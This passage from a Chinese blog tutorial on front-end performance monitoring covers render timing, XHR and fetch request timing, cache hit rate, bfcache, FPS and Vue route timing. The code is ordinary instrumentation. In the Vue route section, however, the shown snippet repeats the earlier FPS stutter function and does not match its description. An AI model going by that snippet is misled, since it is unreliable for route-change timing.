data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217142882-a5994025-f4e1-4ff1-99d7-480026f8fd54.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"> 在浏览器绘制成功后再获取当前时间作为 DOM 绘制时间。<br><a name="tIcjw"></a></p><h4 id="和首屏内的所有图片加载时间作对比"><a href="#和首屏内的所有图片加载时间作对比" class="headerlink" title="和首屏内的所有图片加载时间作对比"></a>和首屏内的所有图片加载时间作对比</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getRenderTime</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> startTime = <span class="number">0</span>;</span><br><span class="line">  entries.<span class="title function_">forEach</span>(<span class="function">(<span class="params">entry</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (entry.<span class="property">startTime</span> &gt; startTime) &#123;</span><br><span class="line">      startTime = entry.<span class="property">startTime</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 需要和当前页面所有加载图片的时间做对比，取最大值</span></span><br><span class="line">  <span class="comment">// 图片请求时间要小于 startTime，响应结束时间要大于 startTime</span></span><br><span class="line">  performance.<span class="title function_">getEntriesByType</span>(<span class="string">&quot;resource&quot;</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      item.<span class="property">initiatorType</span> === <span class="string">&quot;img&quot;</span> &amp;&amp;</span><br><span class="line">      item.<span class="property">fetchStart</span> &lt; startTime &amp;&amp;</span><br><span class="line">      item.<span class="property">responseEnd</span> &gt; startTime</span><br><span class="line">    ) &#123;</span><br><span class="line">      startTime = item.<span class="property">responseEnd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> startTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="j7Uxx"></a></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>现在的代码还没优化完，主要有两点注意事项：</p><ol><li>什么时候上报渲染时间？</li><li>如果兼容异步添加 DOM 的情况？</li></ol><p>第一点，必须要在 DOM 不再变化后再上报渲染时间，一般 load 事件触发后，DOM 就不再变化了。所以我们可以在这个时间点进行上报。<br />第二点，可以在 LCP 事件触发后再进行上报。不管是同步还是异步加载的 DOM，它都需要进行绘制，所以可以监听 LCP 事件，在该事件触发后才允许进行上报。<br />将以上两点方案结合在一起，就有了以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isOnLoaded = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_">executeAfterLoad</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  isOnLoaded = <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> timer;</span><br><span class="line"><span class="keyword">let</span> observer;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkDOMChange</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">  timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 等 load、lcp 事件触发后并且 DOM 树不再变化时，计算首屏渲染时间</span></span><br><span class="line">    <span class="keyword">if</span> (isOnLoaded &amp;&amp; <span class="title function_">isLCPDone</span>()) &#123;</span><br><span class="line">      observer &amp;&amp; observer.<span class="title function_">disconnect</span>();</span><br><span class="line">      <span class="title function_">lazyReportCache</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">        <span class="attr">subType</span>: <span class="string">&quot;first-screen-paint&quot;</span>,</span><br><span class="line">        <span class="attr">startTime</span>: <span class="title function_">getRenderTime</span>(),</span><br><span class="line">        <span class="attr">pageURL</span>: <span class="title function_">getPageURL</span>(),</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      entries = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">checkDOMChange</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkDOMChange() 代码每次在触发 MutationObserver 事件时进行调用，需要用防抖函数进行处理。<br><a name="Jmuep"></a></p><h3 id="接口请求耗时"><a href="#接口请求耗时" class="headerlink" title="接口请求耗时"></a>接口请求耗时</h3><p>接口请求耗时需要对 XMLHttpRequest 和 fetch 进行监听。<br /><strong>监听 XMLHttpRequest</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">originalProto.<span class="property">open</span> = <span class="keyword">function</span> <span class="title function_">newOpen</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">url</span> = args[<span class="number">1</span>];</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">method</span> = args[<span class="number">0</span>];</span><br><span class="line">  originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">originalProto.<span class="property">send</span> = <span class="keyword">function</span> <span class="title function_">newSend</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">onLoadend</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">endTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">duration</span> = <span class="variable language_">this</span>.<span class="property">endTime</span> - <span class="variable language_">this</span>.<span class="property">startTime</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; status, duration, startTime, endTime, url, method &#125; = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">const</span> reportData = &#123;</span><br><span class="line">      status,</span><br><span class="line">      duration,</span><br><span class="line">      startTime,</span><br><span class="line">      endTime,</span><br><span class="line">      url,</span><br><span class="line">      <span class="attr">method</span>: (method || <span class="string">&quot;GET&quot;</span>).<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="attr">success</span>: status &gt;= <span class="number">200</span> &amp;&amp; status &lt; <span class="number">300</span>,</span><br><span class="line">      <span class="attr">subType</span>: <span class="string">&quot;xhr&quot;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">lazyReportCache</span>(reportData);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">removeEventListener</span>(<span class="string">&quot;loadend&quot;</span>, onLoadend, <span class="literal">true</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;loadend&quot;</span>, onLoadend, <span class="literal">true</span>);</span><br><span class="line">  originalSend.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如何判断 XML 请求是否成功？可以根据他的状态码是否在 200~299 之间。如果在，那就是成功，否则失败。<br /><strong>监听 fetch</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> originalFetch = <span class="variable language_">window</span>.<span class="property">fetch</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">overwriteFetch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">fetch</span> = <span class="keyword">function</span> <span class="title function_">newFetch</span>(<span class="params">url, config</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> startTime = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">const</span> reportData = &#123;</span><br><span class="line">      startTime,</span><br><span class="line">      url,</span><br><span class="line">      <span class="attr">method</span>: (config?.<span class="property">method</span> || <span class="string">&quot;GET&quot;</span>).<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="attr">subType</span>: <span class="string">&quot;fetch&quot;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">originalFetch</span>(url, config)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        reportData.<span class="property">endTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">        reportData.<span class="property">duration</span> = reportData.<span class="property">endTime</span> - reportData.<span class="property">startTime</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> data = res.<span class="title function_">clone</span>();</span><br><span class="line">        reportData.<span class="property">status</span> = data.<span class="property">status</span>;</span><br><span class="line">        reportData.<span class="property">success</span> = data.<span class="property">ok</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">lazyReportCache</span>(reportData);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        reportData.<span class="property">endTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">        reportData.<span class="property">duration</span> = reportData.<span class="property">endTime</span> - reportData.<span class="property">startTime</span>;</span><br><span class="line">        reportData.<span class="property">status</span> = <span class="number">0</span>;</span><br><span class="line">        reportData.<span class="property">success</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">lazyReportCache</span>(reportData);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 fetch，可以根据返回数据中的的 ok 字段判断请求是否成功，如果为 true 则请求成功，否则失败。<br /><strong>注意</strong>，监听到的接口请求时间和 chrome devtool 上检测到的时间可能不一样。这是因为 chrome devtool 上检测到的是 HTTP 请求发送和接口整个过程的时间。但是 xhr 和 fetch 是异步请求，接口请求成功后需要调用回调函数。事件触发时会把回调函数放到消息队列，然后浏览器再处理，这中间也有一个等待过程。<br><a name="xa2up"></a></p><h3 id="资源加载时间、缓存命中率"><a href="#资源加载时间、缓存命中率" class="headerlink" title="资源加载时间、缓存命中率"></a>资源加载时间、缓存命中率</h3><p>通过 PerformanceObserver 可以监听 resource 和 navigation 事件，如果浏览器不支持 PerformanceObserver，还可以通过 performance.getEntriesByType(entryType) 来进行降级处理。<br />当 resource 事件触发时，可以获取到对应的资源列表，每个资源对象包含以下一些字段：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217143086-bdfdb068-a7a4-4fdf-9fc7-a0bd65ab3d2d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/300943/1675217143086-bdfdb068-a7a4-4fdf-9fc7-a0bd65ab3d2d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />从这些字段中我们可以提取到一些有用的信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">name</span>: entry.<span class="property">name</span>, <span class="comment">// 资源名称</span></span><br><span class="line">    <span class="attr">subType</span>: entryType,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;performance&#x27;</span>,</span><br><span class="line">    <span class="attr">sourceType</span>: entry.<span class="property">initiatorType</span>, <span class="comment">// 资源类型</span></span><br><span class="line">    <span class="attr">duration</span>: entry.<span class="property">duration</span>, <span class="comment">// 资源加载耗时</span></span><br><span class="line">    <span class="attr">dns</span>: entry.<span class="property">domainLookupEnd</span> - entry.<span class="property">domainLookupStart</span>, <span class="comment">// DNS 耗时</span></span><br><span class="line">    <span class="attr">tcp</span>: entry.<span class="property">connectEnd</span> - entry.<span class="property">connectStart</span>, <span class="comment">// 建立 tcp 连接耗时</span></span><br><span class="line">    <span class="attr">redirect</span>: entry.<span class="property">redirectEnd</span> - entry.<span class="property">redirectStart</span>, <span class="comment">// 重定向耗时</span></span><br><span class="line">    <span class="attr">ttfb</span>: entry.<span class="property">responseStart</span>, <span class="comment">// 首字节时间</span></span><br><span class="line">    <span class="attr">protocol</span>: entry.<span class="property">nextHopProtocol</span>, <span class="comment">// 请求协议</span></span><br><span class="line">    <span class="attr">responseBodySize</span>: entry.<span class="property">encodedBodySize</span>, <span class="comment">// 响应内容大小</span></span><br><span class="line">    <span class="attr">responseHeaderSize</span>: entry.<span class="property">transferSize</span> - entry.<span class="property">encodedBodySize</span>, <span class="comment">// 响应头部大小</span></span><br><span class="line">    <span class="attr">resourceSize</span>: entry.<span class="property">decodedBodySize</span>, <span class="comment">// 资源解压后的大小</span></span><br><span class="line">    <span class="attr">isCache</span>: <span class="title function_">isCache</span>(entry), <span class="comment">// 是否命中缓存</span></span><br><span class="line">    <span class="attr">startTime</span>: performance.<span class="title function_">now</span>(),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>判断该资源是否命中缓存</strong><br />在这些资源对象中有一个 transferSize 字段，它表示获取资源的大小，包括响应头字段和响应数据的大小。如果这个值为 0，说明是从缓存中直接读取的（强制缓存）。如果这个值不为 0，但是 encodedBodySize 字段为 0，说明它走的是协商缓存（encodedBodySize 表示请求响应数据 body 的大小）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isCache</span>(<span class="params">entry</span>) &#123;</span><br><span class="line">  <span class="comment">// 直接从缓存读取或 304</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    entry.<span class="property">transferSize</span> === <span class="number">0</span> ||</span><br><span class="line">    (entry.<span class="property">transferSize</span> !== <span class="number">0</span> &amp;&amp; entry.<span class="property">encodedBodySize</span> === <span class="number">0</span>)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不符合以上条件的，说明未命中缓存。然后将所有命中缓存的数据&#x2F;总数据就能得出缓存命中率。<br><a name="NuS1s"></a></p><h3 id="浏览器往返缓存-BFC（back-x2F-forward-cache）"><a href="#浏览器往返缓存-BFC（back-x2F-forward-cache）" class="headerlink" title="浏览器往返缓存 BFC（back&#x2F;forward cache）"></a>浏览器往返缓存 BFC（back&#x2F;forward cache）</h3><p>bfcache 是一种内存缓存，它会将整个页面保存在内存中。当用户返回时可以马上看到整个页面，而不用再次刷新。据该文章 <a href="https://link.juejin.cn/?target=https://web.dev/bfcache/">bfcache</a> 介绍，firfox 和 safari 一直支持 bfc，chrome 只有在高版本的移动端浏览器支持。但我试了一下，只有 safari 浏览器支持，可能我的 firfox 版本不对。<br />但是 bfc 也是有缺点的，当用户返回并从 bfc 中恢复页面时，原来页面的代码不会再次执行。为此，浏览器提供了一个 pageshow 事件，可以把需要再次执行的代码放在里面。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;pageshow&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 如果该属性为 true，表示是从 bfc 中恢复的页面</span></span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">persisted</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;This page was restored from the bfcache.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;This page was loaded normally.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>从 bfc 中恢复的页面，我们也需要收集他们的 FP、FCP、LCP 等各种时间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onBFCacheRestore</span>(<span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">requestAnimationFrame</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    [<span class="string">&quot;first-paint&quot;</span>, <span class="string">&quot;first-contentful-paint&quot;</span>].<span class="title function_">forEach</span>(<span class="function">(<span class="params">type</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">lazyReportCache</span>(&#123;</span><br><span class="line">        <span class="attr">startTime</span>: performance.<span class="title function_">now</span>() - event.<span class="property">timeStamp</span>,</span><br><span class="line">        <span class="attr">name</span>: type,</span><br><span class="line">        <span class="attr">subType</span>: type,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">        <span class="attr">pageURL</span>: <span class="title function_">getPageURL</span>(),</span><br><span class="line">        <span class="attr">bfc</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码很好理解，在 pageshow 事件触发后，用当前时间减去事件触发时间，这个时间差值就是性能指标的绘制时间。<strong>注意</strong>，从 bfc 中恢复的页面的这些性能指标，值一般都很小，一般在 10 ms 左右。所以要给它们加个标识字段 bfc: true。这样在做性能统计时可以对它们进行忽略。<br><a name="Pmo8q"></a></p><h3 id="FPS"><a href="#FPS" class="headerlink" title="FPS"></a>FPS</h3><p>利用 requestAnimationFrame() 我们可以计算当前页面的 FPS。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> next = <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span></span><br><span class="line">  ? requestAnimationFrame</span><br><span class="line">  : <span class="function">(<span class="params">callback</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> frames = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">fps</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> frame = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> lastSecond = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">calculateFPS</span>(<span class="params"></span>) &#123;</span><br><span class="line">    frame++;</span><br><span class="line">    <span class="keyword">const</span> now = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">if</span> (lastSecond + <span class="number">1000</span> &lt;= now) &#123;</span><br><span class="line">      <span class="comment">// 由于 now - lastSecond 的单位是毫秒，所以 frame 要 * 1000</span></span><br><span class="line">      <span class="keyword">const</span> fps = <span class="title class_">Math</span>.<span class="title function_">round</span>((frame * <span class="number">1000</span>) / (now - lastSecond));</span><br><span class="line">      frames.<span class="title function_">push</span>(fps);</span><br><span class="line"></span><br><span class="line">      frame = <span class="number">0</span>;</span><br><span class="line">      lastSecond = now;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 避免上报太快，缓存一定数量再上报</span></span><br><span class="line">    <span class="keyword">if</span> (frames.<span class="property">length</span> &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">      <span class="title function_">report</span>(</span><br><span class="line">        <span class="title function_">deepCopy</span>(&#123;</span><br><span class="line">          frames,</span><br><span class="line">          <span class="attr">type</span>: <span class="string">&quot;performace&quot;</span>,</span><br><span class="line">          <span class="attr">subType</span>: <span class="string">&quot;fps&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      frames.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>(calculateFPS);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">calculateFPS</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑如下：</p><ol><li>先记录一个初始时间，然后每次触发 requestAnimationFrame() 时，就将帧数加 1。过去一秒后用帧数&#x2F;流逝的时间就能得到当前帧率。</li></ol><p>当连续三个低于 20 的 FPS 出现时，我们可以断定页面出现了卡顿，详情请看 <a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/39292837">如何监控网页的卡顿</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isBlocking</span>(<span class="params">fpsList, below = <span class="number">20</span>, last = <span class="number">3</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; fpsList.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fpsList[i] &amp;&amp; fpsList[i] &lt; below) &#123;</span><br><span class="line">      count++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt;= last) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="jUyEi"></a></p><h3 id="Vue-路由变更渲染时间"><a href="#Vue-路由变更渲染时间" class="headerlink" title="Vue 路由变更渲染时间"></a>Vue 路由变更渲染时间</h3><p>首屏渲染时间我们已经知道如何计算了，但是如何计算 SPA 应用的页面路由切换导致的页面渲染时间呢？本文用 Vue 作为示例，讲一下我的思路。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isBlocking</span>(<span class="params">fpsList, below = <span class="number">20</span>, last = <span class="number">3</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; fpsList.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fpsList[i] &amp;&amp; fpsList[i] &lt; below) &#123;</span><br><span class="line">      count++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt;= last) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑如下：</p><ol><li>监听路由钩子，在路由切换时会触发 router.beforeEach() 钩子，在该钩子的回调函数里将当前时间记为渲染开始时间。</li><li>利用 Vue.mixin() 对所有组件的 mounted() 注入一个函数。每个函数都执行一个防抖函数。</li><li>当最后一个组件的 mounted() 触发时，就代表该路由下的所有组件已经挂载完毕。可以在 this.$nextTick() 回调函数中获取渲染时间。</li></ol><p>同时，还要考虑到一个情况。不切换路由时，也会有变更组件的情况，这时不应该在这些组件的 mounted() 